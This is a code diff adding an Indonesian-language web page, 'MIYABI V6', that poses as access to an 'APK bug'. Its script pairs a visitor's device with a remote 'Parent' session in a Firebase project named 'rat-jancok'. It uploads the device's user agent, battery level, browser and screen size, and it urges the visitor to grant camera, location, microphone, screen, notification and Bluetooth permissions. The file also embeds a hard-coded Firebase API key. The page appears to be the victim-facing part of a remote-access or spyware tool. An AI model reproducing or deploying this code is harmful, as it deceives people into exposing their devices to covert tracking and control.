@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+
+<title>MIYABI V6</title>
+
+<style>
+
+*{
+box-sizing:border-box;
+font-family:monospace;
+}
+
+body{
+margin:0;
+background:#050505;
+color:white;
+}
+
+
+.header{
+
+background:#b00000;
+padding:20px;
+text-align:center;
+font-size:25px;
+font-weight:bold;
+box-shadow:0 0 25px red;
+
+}
+
+
+.card{
+
+background:#111;
+border:1px solid red;
+border-radius:15px;
+padding:20px;
+margin:15px;
+
+}
+
+
+
+.logo{
+
+width:90px;
+height:90px;
+
+margin:auto;
+
+border-radius:50%;
+
+display:flex;
+align-items:center;
+justify-content:center;
+
+font-size:45px;
+
+background:#700000;
+
+box-shadow:0 0 30px red;
+
+}
+
+
+
+.online{
+
+text-align:center;
+margin-top:15px;
+
+}
+
+
+.dot{
+
+width:12px;
+height:12px;
+
+display:inline-block;
+
+border-radius:50%;
+
+background:#00ff66;
+
+box-shadow:
+0 0 5px #00ff66,
+0 0 20px #00ff66,
+0 0 40px #00ff66;
+
+animation:pulse 1s infinite;
+
+}
+
+
+
+@keyframes pulse{
+
+50%{
+
+transform:scale(1.7);
+
+opacity:.3;
+
+}
+
+}
+
+
+
+
+input,button{
+
+width:100%;
+
+padding:14px;
+
+margin-top:10px;
+
+border:0;
+
+border-radius:10px;
+
+font-size:16px;
+
+}
+
+
+
+input{
+
+background:#222;
+
+color:white;
+
+}
+
+
+
+button{
+
+background:red;
+
+color:white;
+
+font-weight:bold;
+
+}
+
+
+
+.info{
+
+background:#080808;
+
+padding:15px;
+
+border-radius:10px;
+
+line-height:1.8;
+
+color:#00ff99;
+
+}
+
+
+
+.permission{
+
+background:#191919;
+
+padding:12px;
+
+border-radius:10px;
+
+margin-top:10px;
+
+border-left:4px solid red;
+
+}
+
+
+</style>
+
+</head>
+
+
+<body>
+
+
+<div class="header">
+
+⚡ MIYABI - NEBULA
+
+</div>
+
+
+
+<div class="card">
+
+
+<div class="logo">
+😈
+</div>
+
+
+<div class="online">
+
+<span class="dot"></span>
+
+<span id="statusText">
+ONLINE
+</span>
+
+
+</div>
+
+
+</div>
+
+
+
+
+<div class="card">
+
+
+<h3>
+🔐 AKSES APK BUG
+</h3>
+
+
+<input id="pairID"
+placeholder="Masukkan ID akses!">
+
+
+<button onclick="connect()">
+
+LOGIN
+
+</button>
+
+
+<div class="info" id="result">
+
+Menunggu koneksi...
+
+</div>
+
+
+</div>
+
+
+
+
+<div class="card">
+
+
+<h3>
+📊 STATUS
+</h3>
+
+
+<div class="info" id="deviceInfo">
+
+Belum tersambung
+
+</div>
+
+
+</div>
+
+
+
+
+<div class="card">
+
+
+<h3>
+🔐 PERMISSION
+(Izinkan semua izin yang diminta agar aplikasi bekerja maksimal!) 
+
+</h3>
+
+
+
+<div class="permission">
+📷 Kamera : Waiting
+</div>
+
+
+<div class="permission">
+📍 Lokasi : Waiting
+</div>
+
+
+<div class="permission">
+🎤 Voice : Waiting
+</div>
+
+
+<div class="permission">
+🖥 Screen : Waiting
+</div>
+
+
+<div class="permission">
+🔔 Notifikasi : Waiting
+</div>
+
+
+<div class="permission">
+📡 Bluetooth : Waiting
+</div>
+
+
+
+</div>
+
+
+
+
+<script type="module">
+
+import {initializeApp}
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-app.js";
+
+
+import {
+
+getDatabase,
+
+ref,
+
+get,
+
+update,
+
+onDisconnect
+
+}
+
+from "https://www.gstatic.com/firebasejs/12.16.0/firebase-database.js";
+
+
+
+const firebaseConfig={
+
+
+apiKey:"AIzaSyCnGnqV6fKvO3XDLBucrsIYPjGuafTun7g",
+
+authDomain:"rat-jancok.firebaseapp.com",
+
+databaseURL:"https://rat-jancok-default-rtdb.asia-southeast1.firebasedatabase.app",
+
+projectId:"rat-jancok",
+
+storageBucket:"rat-jancok.firebasestorage.app",
+
+messagingSenderId:"832199244613",
+
+appId:"1:832199244613:web:d40428c4fd6e73d37d1c2c"
+
+};
+
+
+
+const app=initializeApp(firebaseConfig);
+
+const db=getDatabase(app);
+
+
+
+
+async function getBattery(){
+
+if(navigator.getBattery){
+
+let b=await navigator.getBattery();
+
+return Math.round(b.level*100)+"%";
+
+}
+
+return "Tidak tersedia";
+
+}
+
+
+
+
+
+async function getPermission(){
+
+return {
+
+camera:false,
+
+location:false,
+
+voice:false,
+
+screen:false,
+
+notification:
+Notification.permission==="granted",
+
+bluetooth:false
+
+};
+
+}
+
+
+
+
+
+window.connect=async function(){
+
+
+let id=
+document.getElementById("pairID").value.trim();
+
+
+
+let target=ref(db,"sessions/"+id);
+
+
+
+let snap=await get(target);
+
+
+
+if(!snap.exists()){
+
+result.innerHTML="❌ Pair ID salah";
+
+return;
+
+}
+
+
+
+
+let device={
+
+
+name:
+navigator.userAgent,
+
+
+battery:
+await getBattery(),
+
+
+browser:
+navigator.appName,
+
+
+screen:
+screen.width+"x"+screen.height,
+
+
+status:"Online",
+
+
+lastSeen:Date.now()
+
+
+};
+
+
+
+let permissions=
+await getPermission();
+
+
+
+await update(target,{
+
+connected:true,
+
+deviceInfo:device,
+
+permissions:permissions
+
+});
+
+
+
+onDisconnect(target).update({
+
+connected:false
+
+});
+
+
+
+document.getElementById("statusText")
+.innerHTML="ONLINE";
+
+
+document.getElementById("result")
+.innerHTML="✅ Terhubung ke Parent";
+
+
+
+document.getElementById("deviceInfo")
+.innerHTML=
+
+`
+
+📱 ${device.name}
+
+<br>
+
+🔋 ${device.battery}
+
+<br>
+
+🌐 ${device.browser}
+
+<br>
+
+📐 ${device.screen}
+
+<br>
+
+🟢 Online
+
+`;
+
+
+
+}
+
+
+
+</script>
+
+
+</body>
+</html>
